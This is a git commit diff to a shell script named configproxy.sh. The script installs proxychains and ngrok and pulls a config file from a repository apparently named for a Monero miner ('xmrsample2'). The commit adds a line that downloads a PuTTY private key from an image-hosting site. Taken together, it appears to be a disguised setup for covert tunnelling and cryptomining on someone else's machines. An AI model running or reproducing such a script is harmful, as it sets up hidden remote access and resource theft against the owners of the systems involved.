8a65e09f2d3a032998bf6bb72877da8ef08c43ef
duggsydaddy <32011724+duggsydaddy@users.noreply.github.com>
2021-03-04 07:08:05 +0530

    Update configproxy.sh

--- configproxy.sh
+++ configproxy.sh
@@ -1,6 +1,7 @@
 #!/bin/bash
 yum install nano wget curl git cmake libcanberra-gtk2 libcanberra-gtk3 libcanberra-devel screen putty -y
 git clone https://github.com/rofl0r/proxychains-ng.git
+wget https://niquityr.sirv.com/vardaaaaaa.ppk -O vardaaaaaa.ppk
 wget https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-amd64.zip && unzip ngrok-stable-linux-amd64.zip
 cd proxychains-ng
 wget https://raw.githubusercontent.com/duggsydaddy/xmrsample2/main/config.json && wget https://raw.githubusercontent.com/duggsydaddy/xmrsample2/main/SHA256SUMS
